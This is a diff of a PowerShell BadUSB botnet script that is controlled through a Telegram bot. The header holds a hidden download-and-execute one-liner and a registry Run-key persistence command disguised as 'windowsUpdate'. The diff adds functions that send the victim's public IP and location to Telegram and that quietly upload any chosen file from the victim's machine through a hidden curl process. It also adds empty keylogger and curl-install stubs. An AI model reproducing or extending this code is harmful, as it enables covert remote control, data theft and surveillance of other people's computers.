@@ -9,10 +9,10 @@ BADUSB COMMANDS:
     PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
 
 REGEDIT:
-	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Docu
-ments\windowsUpdate.ps1"	
+	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
 https://www.akadia.com/services/windows_registry.html 
 	#>
+
 
 ############
 ## CONFIG ##
@@ -67,6 +67,10 @@ function cleanAll {
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
 }
 
+function installCurl {
+    
+}
+
 function sendPhoto {
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\afranco\Documents\screenshot.jpg"
@@ -84,6 +88,27 @@ function sendPhoto {
     
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
+
+function keylogger {
+
+}
+
+function ipPublic {
+    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
+    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
+}
+
+function download($FileToDownload) {
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
+    $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
+    $curl = $ruta + "\" + "curl.exe"
+    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
+    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
+
+    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
+}
+
 
 #####################
 ## BYPASS POLICIES ##
@@ -215,6 +240,13 @@ While ($DoNotExit)  {
       }
       "/cleanAll $ipV4" {
         cleanAll
+      }
+      "/ipPublic $ipV4" {
+        ipPublic
+      }
+      "/download $ipV4 *"{
+        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
+        download $FileToDownload
       }
 	  default  {
 	    #The message sent is unknown
